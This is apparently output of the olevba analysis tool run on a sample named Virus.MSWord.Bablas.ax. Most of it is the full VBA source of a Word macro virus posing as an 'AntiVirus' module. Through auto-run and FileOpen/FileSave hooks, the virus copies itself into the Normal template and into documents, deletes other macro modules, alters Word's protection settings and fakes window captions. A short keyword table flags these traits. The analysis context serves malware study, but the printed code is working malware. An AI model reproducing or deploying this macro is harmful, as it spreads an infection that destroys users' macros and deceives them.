olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.ax
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.ax - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AntiVirus.bas 
in file: Virus.MSWord.Bablas.ax - OLE stream: 'Macros/VBA/AntiVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ShowMessage()
    On Error Resume Next
    H = Time
    If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For i = 1 To 100
        Beep
    Next i
    H = MsgBox("Selamat. Anda telah memakai AntiVirus yang benar.", vbOKOnly + vbExclamation, "Ucapan Selamat")
    End If
End Sub

Sub Bablas()
    On Error Resume Next
    Options.SaveNormalPrompt = True
    Options.VirusProtection = True
    Options.SavePropertiesPrompt = True
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "AntiVirus sedang aktif"
    ActiveWindow.Caption = "( SarwoAsih - Mbah Sanggar )"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "AntiVirus" Then DocOk = True
        If Obj.Name <> "AntiVirus" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.StatusBar = "Copying AntiVirus From Normal Template to " _
        + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="AntiVirus", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "AntiVirus" Then NorOk = True
        If Obj.Name <> "AntiVirus" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.StatusBar = "Copying AntiVirus From " + ActiveDocument.Name + _
        " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="AntiVirus", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = True
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    On Error Resume Next
    ShowMessage
    Application.Quit
End Sub

Sub FileOpen()
    On Error Resume Next
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros True
End Sub

Sub AutoOpen()
    On Error Resume Next
    Bablas
    ChangeCap
    SikatTemplate
    On Error Resume Next
    NormalTemplate.Save
    RestoreCap
End Sub

Sub AutoClose()
    On Error Resume Next
    SikatDocument
    ActiveDocument.Close
End Sub

Sub FileClose()
    On Error Resume Next
    AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Ancurin()
    On Error Resume Next
    C = Documents.Count
    If C <> 0 Then
        If ActiveDocument.Name <> "Document1" Then
            Normal.AntiVirus.SikatDocument
            WordBasic.DisableAutoMacros True
        End If
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.AntiVirus.Ancurin"
    End If
End Sub

Sub AutoExec()
    On Error Resume Next
    WordBasic.DisableAutoMacros True
    Bablas
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.AntiVirus.Ancurin"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

